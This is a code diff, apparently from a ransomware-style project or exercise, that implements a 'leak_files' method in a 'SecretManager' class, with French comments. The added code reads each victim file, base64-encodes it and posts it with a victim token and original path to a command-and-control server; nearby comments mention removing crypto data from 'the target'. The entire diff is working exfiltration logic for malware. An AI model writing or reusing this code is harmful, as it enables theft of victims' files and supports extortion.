@@ -183,7 +183,35 @@ class SecretManager:
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        # Parcours et envoie de chaque fichier au serveur CNC
+        for fichier in files:
+            try:
+                # Lecture et encodage du fichier
+                with open(fichier, "rb") as f:
+                    contenu_fichier = f.read()
+                fichier_b64 = self.bin_to_b64(contenu_fichier)
+                nom_fichier = os.path.basename(fichier)
+                chemin_initial = os.path.dirname(fichier)
+
+                # Préparation des données à envoyer
+                payload = {
+                    "token": self.get_hex_token(),
+                    "fichier": fichier_b64,
+                    "nom": nom_fichier,
+                    "chemin_origine": chemin_initial
+                }
+                # URL de destination pour le CNC
+                cnc_url = f"http://{self._remote_host_port}/file"
+                reponse = requests.post(cnc_url, json=payload)
+
+                # Vérification du statut de l'envoi
+                if reponse.status_code == 200:
+                    self._log.info(f"Fichier {fichier} envoyé avec succès.")
+                else:
+                    self._log.error(f"Échec lors de l'envoi du fichier {fichier} : {reponse.text}")
+            except Exception as erreur:
+                self._log.error(f"Erreur en envoyant le fichier {fichier} : {erreur}")
+        
 
     def clean(self):
         # remove crypto data from the target
